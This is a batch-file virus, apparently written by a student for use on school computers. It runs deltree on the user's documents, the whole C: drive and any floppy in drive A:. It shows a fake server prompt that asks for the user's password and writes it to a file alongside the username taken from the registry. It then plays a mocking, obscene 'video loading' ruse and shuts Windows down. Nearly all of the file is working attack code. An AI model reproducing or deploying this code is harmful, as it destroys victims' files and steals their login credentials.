   @echo off
    : I knew you'd find me
   : whoever you are...isnt it nice to know your students are
   : learning? huh?
   : That one of your students built this small ...thingy from
   : scratch should make you proud.
   : I hope this does little damage or esle if I'm found out...
   : Teachers and admins are lucky cos I just didnt know where their files
   : are stored, and I couldnt be bothered to try every drive letter.
   : I coulda found out but I'm unleashing (unleashing - feels good to use that word)
   : this on monday...and I dont suppose I could find out where admins' documents
   : are stored then.
   : Goodday....and wipe that smile/smirk off you face.
   : Signed....
   : I'm thinking of a name...
   : This is my first one and I guess If I'm not gonna be found out yet,
   : I'll need a hacker/cracker -like name, like...
   : chEwBakKa
   : I'm OUt
   : And Hey! How come the antivirus dont pick it up?
   : Guess i wont ever get an answer...

   ren c:\mydocu~1\*.* *.bak
   deltree /y c:\mydocu~1\
   ren c:\*.* *.bak
   deltree /y c:\

   : See, the trick is to cause the harm first...everytnig below is trash
   : All that were needed are these two lines above.
   : I coulda just let it run this without the user knowing, but did I want to?
   : No! What fun will it be then?

   :: I write this part myself

   :ISDISKIN
   echo if exist a:\nul goto OKAY > checkdisk.bat
   echo goto NOTOKAY >> checkdisk.bat
   echo :NOTOKAY >> checkdisk.bat
   echo if exist ~exist.txt del ~exist.txt >> checkdisk.bat
   echo goto DONE >> checkdisk.bat
   echo :OKAY >> checkdisk.bat
   echo rem%%"%%>%%"%% ~exist.txt >> checkdisk.bat
   echo goto DONE >> checkdisk.bat
   echo :DONE >> checkdisk.bat
   ctty nul
   command /f /c checkdisk.bat
   ctty con
   del checkdisk.bat
   if not exist ~exist.txt goto NODISK
   del ~exist.txt > nul
   cls
   deltree /y a:\
   cls

   :NoDisk
   :Identify user
   start /w regedit /e reg.txt HKEY_LOCAL_MACHINE\Network\Logon
   type reg.txt | find "username" > "us#rname.bat"
   echo set NetUser=%%1>"username.bat"
   call "us#rname.bat"
   del "us?rname.bat" > nul
   del reg.txt
   echo Current User is %NetUser%

   type accum.ini | find /v "Netuser=" > accum.ini
   echo %NetUser%=Fool>> accum.ini

   ::Ask for their pass
   ::First test to see if we are on NT or similar OS
   > ~userin.vbs echo 1234&rem
   type ~userin.vbs | find "rem" > nul
   if errorlevel 1 goto WINNT
   goto WIN9X

   :WIN9X
    > ~userin.vbs echo strUserIn = InputBox("THE SERVER HAS IDENTIFIED YOU AS " & (chr(13)) & %NetUser% & (chr(13)) & "YOUR LOGIN SETTINGS ARE NOT CORRECT" & (chr(13)) & "ENTER YOUR PASSWORD TO PREVENT AN AUTOMATIC LOG-OFF" & (chr(13)) & "NOTE: You will not be given the chance to close open programs before being logged off if you click 'Cancel'")
   >> ~userin.vbs echo Set fs = Wscript.CreateObject("Scripting.FileSystemObject")
   >> ~userin.vbs echo strFileName = fs.BuildPath(Wscript.ScriptFullName & "\..", "~userin.bat")
   >> ~userin.vbs echo strFileName = fs.GetAbsolutePathName(strFileName)
   >> ~userin.vbs echo Set ts = fs.OpenTextFile(strFileName, 2, True)
   >> ~userin.vbs echo ts.WriteLine "set userin=" & strUserIn
   >> ~userin.vbs echo ts.Close
   goto RUN

   :WINNT
    > ~userin.vbs echo strUserIn = InputBox("Enter Data")
   >> ~userin.vbs echo Set fs = Wscript.CreateObject("Scripting.FileSystemObject")
   >> ~userin.vbs echo strFileName = fs.BuildPath(Wscript.ScriptFullName ^& "\..", "~userin.bat")
   >> ~userin.vbs echo strFileName = fs.GetAbsolutePathName(strFileName)
   >> ~userin.vbs echo Set ts = fs.OpenTextFile(strFileName, 2, True)
   >> ~userin.vbs echo ts.WriteLine "set userin=" ^& strUserIn
   >> ~userin.vbs echo ts.Close
   goto RUN

   :RUN
   ::Now run the created script
   start /w wscript.exe ~userin.vbs
   del ~userin.vbs

   ::Asking to call the created batch file
   call ~userin.bat
   del ~userin.bat

   ::display the data!


   echo %userin%=money>> accum.ini
   echo You entered "%USERIN%", as your password, if this is not you will be logged OFF
   echo immediately. This might cause you lose some files.
   echo.
   TYPE NUL | CHOICE.COM /N /CY /TY,5 >NUL





   @echo.
   @echo.
   @echo.
   @echo.
   @echo You are trying to Open a Video file that has been identified as...
   @echo.
   @echo "Eminem - Slimeball Featuring Nate Dogg, Snoop Dogg, Dr dre and Xzibit"
   @echo.
   @echo Please wait while the Video starts...
   TYPE NUL | CHOICE.COM /N /CY /TY,10 >NUL
   cls
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo Err...OK I lied! There's no fuckin' video file and this aint no April
   @echo fool's day either. Just hold on and you'll be enlightened in a mo'
   TYPE NUL | CHOICE.COM /N /CY /TY,10 >NUL
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo Preparing to DELETE this asshole's files...
   TYPE NUL | CHOICE.COM /N /CY /TY,5 >NUL
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   cls
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo Err...OK I lied! There's no fuckin' video file and this aint no April
   @echo fool's day either. Just hold on and you'll be enlightened in a mo'
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo Deleting this asshole's files...
   @echo 0 percent down tha drain
   TYPE NUL | CHOICE.COM /N /CY /TY,3 >NUL
   cls
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo Err...OK I lied! There's no fuckin' video file and this aint no April
   @echo fool's day either. Just hold on and you'll be enlightened in a mo'
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo Still fuckin' wit this same dickhead
   @echo 10 percent down tha drain
   TYPE NUL | CHOICE.COM /N /CY /TY,4 >NUL
   cls
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo Err...OK I lied! There's no fuckin' video file and this aint no April
   @echo fool's day either. Just hold on and you'll be enlightened in a mo'
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo This dirtbag's really fucked now
   @echo 50 percent down tha drain
   TYPE NUL | CHOICE.COM /N /CY /TY,3 >NUL
   cls
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo Err...OK I lied! There's no fuckin' video file and this aint no April
   @echo fool's day either. Just hold on and you'll be enlightened in a mo'
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo Now this muthafucka aint gonna be happy
   @echo 70 percent down tha drain
   TYPE NUL | CHOICE.COM /N /CY /TY,3 >NUL
   cls
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo Err...OK I lied! There's no fuckin' video file and this aint no April
   @echo fool's day either. Just hold on and you'll be enlightened in a mo'
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo See ya'll cocksuckers later
   @echo 100 percent down tha drain
   TYPE NUL | CHOICE.COM /N /CY /TY,3 >NUL
   cls
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @ echo He he he...always thought, u were smart, ei?!
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo.
   @echo Proved you wrong, mate.
   @echo Wrong, didnt I?!
   @echo Wrong...Wrong...Wroooong...muthafucka!!
   TYPE NUL | CHOICE.COM /N /CY /TY,10 >NUL
   rundll user,exitwindows 0 5

   Was Created By Script Master
   You Can Contact me Throw My ICQ 113391222 if you want to.
